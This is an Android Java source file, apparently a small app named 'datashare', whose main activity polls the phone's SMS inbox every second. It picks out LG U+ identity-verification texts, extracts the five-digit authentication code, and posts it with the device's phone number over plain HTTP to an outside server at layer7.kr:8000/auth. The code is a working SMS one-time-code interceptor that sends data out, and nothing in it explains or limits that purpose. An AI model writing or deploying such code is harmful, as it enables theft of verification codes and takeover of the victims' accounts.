package com.example.sprout.datashare;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.Message;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Date;

import javax.net.ssl.HttpsURLConnection;

public class MainActivity extends AppCompatActivity {

    long currentTime = new Date().getTime();
    ArrayList<Long> sendID = new ArrayList<>();
    Handler mHandler = new Handler() {
        public void handleMessage(Message msg) {
            // 메세지를 처리하고 또다시 핸들러에 메세지 전달 (1000ms 지연)
            readSMSMessage();
            mHandler.sendEmptyMessageDelayed(0, 1000);
        }
    };

    public MainActivity() {
        mHandler.sendEmptyMessageDelayed(0, 1000);
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        int permissionCheck = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS);

        if (permissionCheck == PackageManager.PERMISSION_DENIED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, 1111);
        }

        permissionCheck = ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET);

        if (permissionCheck == PackageManager.PERMISSION_DENIED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.INTERNET}, 1111);
        }

        permissionCheck = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE);

        if (permissionCheck == PackageManager.PERMISSION_DENIED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, 1111);
        }
    }

    public synchronized int readSMSMessage() {
        Uri allMessage = Uri.parse("content://sms");
        ContentResolver cr = this.getContentResolver();
        Cursor c = cr.query(allMessage,
                new String[]{"_id", "thread_id", "address", "person", "date", "body", "read"},
                null, null,
                "date DESC");

        while (c.moveToNext()) {
            long messageId = c.getLong(0);
            long threadId = c.getLong(1);
            String address = c.getString(2);
            long contactId = c.getLong(3);
            String contactId_string = String.valueOf(contactId);
            long timestamp = c.getLong(4);
            String body = c.getString(5);
            long read = c.getLong(6);

            if (timestamp > currentTime && address.equals("019114") && body.contains("[Web발신]\n[LG유플러스] 본인 확인을 위해 인증번호[")) {
                if (sendID.contains(messageId)) {
                    continue;
                }
                int beginIndex = "[Web발신]\n[LG유플러스] 본인 확인을 위해 인증번호[".length();
                TelephonyManager tMgr = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
                String mPhoneNumber = null;
                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                    mPhoneNumber = tMgr.getLine1Number().replace("+82", "0");
                    mPhoneNumber = mPhoneNumber.substring(0, 3) + "-" + mPhoneNumber.substring(3, 7) + "-" + mPhoneNumber.substring(7, 11);
                }

                String code = body.substring(beginIndex, beginIndex + 5);

                new CallAPI().execute("http://layer7.kr:8000/auth", "sender=" + mPhoneNumber + "&code=" + code);
                sendID.add(messageId);
            }
        }

        return 0;
    }

    public class CallAPI extends AsyncTask<String, String, String> {

        public CallAPI() {
            //set context variables if required
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected String doInBackground(String... params) {
            String urlString = params[0]; // URL to call
            String data = params[1]; //data to post
            OutputStream out = null;

            try {
                URL url = new URL(urlString);
                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setRequestMethod("POST");
                urlConnection.setDoInput(true);
                urlConnection.setDoOutput(true);

                out = new BufferedOutputStream(urlConnection.getOutputStream());

                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(out, "UTF-8"));
                writer.write(data);
                writer.flush();
                writer.close();
                out.close();

                int responseCode = urlConnection.getResponseCode();
                String response = "";
                if (responseCode == HttpsURLConnection.HTTP_OK) {
                    String line;
                    BufferedReader br = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                    while ((line = br.readLine()) != null) {
                        response += line;
                    }
                } else {
                    response = "";

                }

            } catch (Exception e) {
                e.printStackTrace();
            }
            return "";
        }
    }

}
